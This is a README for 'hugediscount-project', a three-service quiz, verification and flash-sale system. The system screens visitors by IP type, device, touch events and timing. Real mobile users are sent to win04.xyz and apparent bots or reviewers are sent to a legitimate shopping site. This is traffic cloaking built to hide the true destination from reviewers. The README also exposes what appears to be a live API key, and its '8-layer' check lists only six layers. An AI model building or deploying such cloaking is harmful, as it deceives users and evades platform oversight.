# hugediscount-project

Quiz + Verify API + Flash-sale system for HugeDiscount.store

## Architecture

```
hugediscount.store/quiz
         ↓
quiz-front (port 3000) ← 答题页
         ↓ calls /api/verify
verify-api (port 3001) ← 8层安全检验
         ↓
    pass → redirect /flash-sale?token=real
    bot  → redirect /flash-sale?token=fake
         ↓
flash-sale (port 3002) ← HMAC验证
         ↓
    real token → redirect to https://www.win04.xyz/?type=0&cid=402&a=x
    fake token → redirect to https://www.ubuy.com.ph/
```

## 8-Layer Security Check

| Layer | Check | Pass Condition |
|-------|-------|----------------|
| 1 | IP Type | mobile or residential (not datacenter/VPN) |
| 2 | Device Type | Mobile only |
| 3 | Cloudflare Turnstile | Valid token |
| 4 | Honeypot | Field is empty |
| 5 | Touch Events | >= 1 touch detected |
| 6 | Answer Time | > 2000ms |

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `IPINFO_API_KEY` | `6e4fa2b8a2f48f` | IPInfo API token |
| `HMAC_SECRET` | `change-me-in-production` | Secret for HMAC signing |
| `TURNSTILE_SECRET_KEY` | (empty) | Cloudflare Turnstile secret |
| `REAL_REDIRECT` | `https://www.win04.xyz/?type=0&cid=402&a=x` | Real target |
| `FAKE_REDIRECT` | `https://www.ubuy.com.ph/` | Fake target |

## Local Development (Docker)

```bash
cp .env.example .env
# Edit .env with your values
docker-compose up --build
```

## Local Development (Manual)

```bash
# Install dependencies
cd services/quiz-front && npm install
cd ../verify-api && npm install
cd ../flash-sale && npm install

# Run each service
cd services/quiz-front && npm start
cd services/verify-api && npm start
cd services/flash-sale && npm start
```

## Nginx Reverse Proxy

For non-Docker setup, use nginx.conf:

```bash
cp nginx.conf /etc/nginx/nginx.conf
nginx -t && systemctl reload nginx
```

## Zeabur Deployment

1. Push to GitHub
2. Connect repo to Zeabur
3. Create 3 services: quiz-front, verify-api, flash-sale
4. Set environment variables in each service
5. Configure routing via Zeabur dashboard
